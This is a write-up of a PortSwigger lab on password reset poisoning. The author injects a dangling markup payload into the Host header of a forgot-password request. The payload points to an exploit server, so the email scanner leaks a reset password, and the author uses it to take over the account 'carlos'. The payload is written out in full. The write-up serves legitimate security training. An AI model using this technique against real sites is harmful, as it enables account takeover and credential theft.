# Password reset poisoning via dangling markup

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup), you'll learn: Password reset poisoning via dangling markup! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

This lab is vulnerable to password reset poisoning via [dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup). To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

## Exploitation

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228041009.png)

In here, we can see that there is a `Forgot password?` link.

**Let's try to reset user `wiener` password:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228041054.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228041103.png)

**Email client:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228041148.png)

When we reset user's password, it'll send an email to that account.

In that email, **it'll include a new password** and a login link.

Also, **the email will be scanned by the MacCarthy Email Security service.**

**Let's take a look at the email page:**
```html
    <section class='maincontainer is-page'>
        <div class=container>
            <h4>Your email address is wiener@exploit-0a6300c0039c728fc01880350103009d.exploit-server.net</h4>
            <h6>Displaying all emails @exploit-0a6300c0039c728fc01880350103009d.exploit-server.net and all subdomains</h6>
            <table>
                <tr><th>Sent</th><th>From</th><th>Subject</th><th>Body</th><th></th></tr>
                <tr><td>2022-12-28 09:10:56 +0000</td><td style='word-break: break-word'>no-reply@0af400d6039b72eac060812d000b00df.web-security-academy.net</td><td style='overflow-wrap: break-word; max-width: 150px'>Account recovery</td><td><div style='word-break: break-all' class=dirty-body data-dirty='<p>Hello!</p><p>Please <a href=&apos;https://0af400d6039b72eac060812d000b00df.web-security-academy.net/login&apos;>click here</a> to login with your new password: tkpWbBoWlm</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>'></div></td><td><a target=_blank href='?raw=0'>View raw</a></td></tr>
            </table>
        </div>
    </section>
</div>
<script src='resources/js/domPurify-2.0.15.js'></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        for (let el of document.getElementsByClassName('dirty-body')) {
            el.innerHTML = DOMPurify.sanitize(el.getAttribute('data-dirty'));
        }
    });
</script>
```

As you can see, it has a JavaScript library called DOMPurify, which **sanitizes HTML and prevents XSS attacks.**

**In the email client, we can also view the raw content of an email:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228041910.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228041916.png)

In here, we can see that the HTML codes doesn't sanitized.

**Armed with above information, we can start to modify the `Host` HTTP header in `/forgot-password`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228042140.png)

**Let's change it to a random host:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228042212.png)

Hmm... HTTP status `504 Gateway Timeout`.

**Then what if I inject duplicate Host headers?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228042341.png)

`Duplicate header names are not allowed`.

**After some trial and errors, I found that we can append anything to the normal `Host` header:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228042555.png)

**Email client:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228042626.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228042638.png)

**Hmm... Looks like our modified `Host` header successfully appended to the `<a>` tag!**

Now, **we can injection our XSS(Cross-Site Scripting) payload to the `<a>` tag!**

```html
:'<a href="//exploit-0a6300c0039c728fc01880350103009d.exploit-server.net/?
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228043506.png)

**Email client:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228043516.png)

As you can see, the rest of the body is gone, which is good!

**Let's view the raw content:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228043553.png)

**Our XSS payload successfully injected to the `<a>` tag, and the MacCarthy Email Security service scanned the email content, which will fetch the email body's content to our exploit server!**

**Check exploit server's access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228043727.png)

The password is included in the log file!

**Now, we can obtain `carlos` new password via changing the `username` parameter in the POST `/forgot-password`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228043819.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228043836.png)

Boom! We got it!

Let's login as user `carlos`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228043859.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Host-Header-Attacks/HTTP-Host-Header-7/images/Pasted%20image%2020221228043922.png)

We're user `carlos`!

# What we've learned:

1. Password reset poisoning via dangling markup